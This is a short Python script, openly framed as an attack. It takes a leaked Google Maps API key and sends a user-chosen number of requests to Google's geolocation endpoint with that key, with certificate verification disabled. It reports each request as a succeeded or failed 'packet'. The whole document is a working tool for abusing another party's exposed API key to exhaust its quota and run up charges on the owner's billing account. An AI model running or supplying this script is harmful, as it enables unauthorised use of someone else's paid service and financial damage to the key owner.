#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama, calendar, time
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def generate_url(apikey):
    return f"https://www.googleapis.com/geolocation/v1/geolocate?key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to geolocation: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey)
        print(url)
        data = {'considerIp': 'true'}
        response = requests.post(url, data=data, verify=False)
        if response.text.find("error") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

